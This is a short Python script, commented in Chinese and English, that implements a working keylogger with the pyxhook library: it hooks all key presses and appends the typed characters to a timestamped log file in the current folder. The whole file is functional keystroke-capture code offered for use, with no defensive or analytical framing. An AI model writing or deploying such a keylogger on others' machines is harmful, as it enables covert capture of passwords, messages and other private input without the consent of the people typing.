# import needed modules
import os
from datetime import datetime
import pyxhook  
# 主要就是使用这个库pyxhook

def main():
    # Specify the name of the file (can be changed )
    log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'
    # 指定当前文件的log文件，当前文件夹下当前时间.log
    # The logging function with {event parm}
    def OnKeyPress(event):  #这是 pyxhook的值 

        with open(log_file, "a") as f:  # Open a file as f with Append (a) mode
            if event.Key == 'P_Enter' :   # 如果是回车键，换行
                f.write('\n')
            else:
                f.write(f"{chr(event.Ascii)}")  # Write to the file and convert ascii to readable characters 不然就写进去

    # Create a hook manager object
    new_hook = pyxhook.HookManager() # 创建一个hook管理对象 实现hook后
    new_hook.KeyDown = OnKeyPress # # 定义我们的回调在按下一个键时触发

    new_hook.HookKeyboard()  # set the hook 设置hook键盘

    try:
        new_hook.start()  # start the hook
    except KeyboardInterrupt: #这个是按下ctrl-c的异常处理写法
        # User cancelled from command line so close the listener
        new_hook.cancel() # 取消hook操作
        pass
    except Exception as ex: # 或者其他异常时的处理，写了两异常
        # Write exceptions to the log file, for analysis later.
        msg = f"Error while catching events:\n  {ex}"
        pyxhook.print_err(msg)
        with open(log_file, "a") as f:
            f.write(f"\n{msg}")

# 实现一个log文件记录键盘操作记录，然后就用这个库去做一些键盘操作就行
if __name__ == "__main__":
    main()
